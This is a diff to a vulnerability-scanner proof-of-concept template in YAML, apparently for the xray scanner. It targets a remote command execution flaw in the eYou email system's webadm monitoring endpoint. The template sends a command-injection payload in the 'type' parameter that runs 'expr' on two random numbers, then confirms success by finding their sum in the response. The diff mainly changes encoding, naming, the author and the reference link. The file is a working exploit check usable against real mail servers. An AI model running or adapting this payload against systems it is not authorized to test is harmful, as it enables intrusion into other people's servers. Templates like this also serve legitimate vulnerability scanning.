@@ -1,4 +1,4 @@
-name: poc-yaml-eyou-rce
+name: poc-yaml-eyou-email-system-rce
 set:
   r1: randomInt(800000000, 1000000000)
   r2: randomInt(800000000, 1000000000)
@@ -7,9 +7,12 @@ rules:
     path: /webadm/?q=moni_detail.do&action=gragh
     headers:
       Content-Type: application/x-www-form-urlencoded
-    body: type='|expr {{r1}} + {{r2}}||'
-    expression: response.body.bcontains(bytes(string(r1 + r2)))
+    body: |
+      type='|expr%20{{r1}}%20%2B%20{{r2}}||'
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
 detail:
-  author: jingling(https://github.com/shmilylty)
+  author: Print1n(http://print1n.top)
+  description: 亿邮电子邮件系统 远程命令执行漏洞
   links:
-    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+    - https://fengchenzxc.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
